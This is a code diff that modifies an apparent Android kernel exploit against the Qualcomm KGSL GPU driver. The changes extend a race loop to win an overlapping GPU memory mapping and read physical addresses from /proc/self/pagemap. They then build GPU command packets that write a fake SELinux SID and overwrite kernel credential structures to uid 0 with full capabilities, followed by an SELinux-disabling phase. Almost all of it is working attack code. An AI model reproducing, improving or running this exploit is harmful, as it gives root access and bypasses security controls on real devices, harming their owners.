@@ -363,24 +363,32 @@ int main(int argc, char **argv) {
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
+    void *overlap_map = MAP_FAILED;
     int hit = 0;
-    for (int i = 0; i < 5000000; i++) {
+    for (int i = 0; i < 20000000; i++) {
         void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
             kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
-        if (e == ENODEV) { hit = 1; break; }
-        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
+        if (r != MAP_FAILED) {
+            overlap_map = r;
+            hit = 1;
+            break;
+        }
+        if (i % 2000000 == 0) printf("  race %d/%d errno=%d\n", i, 20000000, e);
     }
 
     race_done = 1;
     pthread_join(thr, NULL);
 
-    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
-    printf("[+] Race won! (errno=ENODEV)\n");
+    if (!hit || overlap_map == MAP_FAILED) {
+        printf("[-] Race failed: no valid overlap mapping\n");
+        close(kgsl_fd);
+        return 1;
+    }
+    printf("[+] Race won! overlap mapped at 0x%lx\n", (unsigned long)overlap_map);
 
-    // --- Get physical address of OVERLAP_ADDR via pagemap (now it's mapped) ---
+    // Get physical address of OVERLAP_ADDR via pagemap
     int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
     if (pagemap_fd < 0) die("open pagemap");
     uint64_t pagemap_entry;
@@ -488,7 +496,7 @@ int main(int argc, char **argv) {
     int dw;
     unsigned int ts;
 
-    // PAGE_OFFSET for arm64 with 39-bit VA is typically 0xFFFFFF8000000000
+    // PAGE_OFFSET for arm64 39-bit VA (typical)
     uint64_t page_offset = 0xFFFFFF8000000000ULL;
     printf("[*] Using PAGE_OFFSET = 0x%lx\n", (unsigned long)page_offset);
 
@@ -527,9 +535,10 @@ int main(int argc, char **argv) {
             cred_pages[n_cred] = va;
             cred_offs[n_cred] = cred_off_found;
 
+            // Compute physical address of this cred page
             uint64_t pa_cred = overlap_base_pa + (va - OVERLAP_ADDR);
-            uint64_t kva_fake = page_offset + pa_cred + 0xFB0;
-            fake_sec_addrs[n_cred] = kva_fake;
+            uint64_t kva_cred = page_offset + pa_cred;
+            fake_sec_addrs[n_cred] = kva_cred + 0xFB0;
             printf("  fake_sec_addr = 0x%lx\n", (unsigned long)fake_sec_addrs[n_cred]);
             n_cred++;
 
@@ -557,10 +566,22 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    // Write fake SID=1 into the pages
+    // Write fake SID=1 into the pages using GPU (since we have GPU write capability)
     for (int p = 0; p < n_cred; p++) {
-        uint32_t *page = (uint32_t *)(uintptr_t)cred_pages[p];
-        page[0xFB0 / 4] = 1;
+        uint64_t fake_sid_addr = cred_pages[p] + 0xFB0;
+        memset(ib_m, 0, 0x10000);
+        cmd = (uint32_t *)ib_m;
+        dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        uint32_t al, ah;
+        split64(fake_sid_addr, &al, &ah);
+        cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+        cmd[dw++] = al; cmd[dw++] = ah;
+        cmd[dw++] = 1; // SID_KERNEL = 1
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx_id, ts);
     }
 
     printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full, security=kernel SID)\n");
@@ -571,6 +592,7 @@ int main(int argc, char **argv) {
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
 
+        // UID/GID fields (offset 0x04)
         uint64_t uid_base = cbase + 0x04;
         for (int i = 0; i < 8; i++) {
             uint32_t al, ah;
@@ -580,6 +602,7 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0;
         }
 
+        // Capabilities (offset 0x28)
         uint64_t cap_base = cbase + 0x28;
         for (int i = 0; i < 4; i++) {
             uint32_t al, ah;
@@ -589,6 +612,7 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
         }
 
+        // Overwrite cred->security pointer
         if (sec_offset >= 0 && fake_sec_addrs[p] != 0) {
             uint64_t sec_addr_base = cbase + sec_offset;
             uint32_t al, ah;
@@ -608,7 +632,7 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite and security pointer redirection done\n");
 
-    // The rest (Phase 9, 9b, 10, 11) remains unchanged
+    // The rest (Phase 9, 9b, 10, 11) remains unchanged (fallback attempts)
     printf("[*] Phase 9: Aggressive SELinux disabling (fallback)\n");
 
     memset(ib_m, 0, 0x10000);
